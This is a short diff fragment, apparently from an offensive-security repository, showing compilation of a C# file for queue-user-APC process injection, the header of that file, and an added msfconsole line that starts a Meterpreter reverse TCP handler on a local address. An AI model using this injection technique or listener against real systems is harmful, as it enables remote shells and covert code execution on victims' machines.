@@ -8,6 +8,8 @@ C:\Windows\System32>csc.exe "C:\Users\Andrea\Desktop\QueApcProcessInjection.cs"
 Compilatore Microsoft (R) Visual C# versione 3.10.0-4.21329.37 (246ce641)
 Copyright (C) Microsoft Corporation. Tutti i diritti sono riservati.
 
+└─# msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.0.3
+
 /*QUEUE USER APC PROCESS INJECTION
 description: |
 	Injects shellcode into a newly spawned remote process using user-mode asynchronous procedure call (APC). 
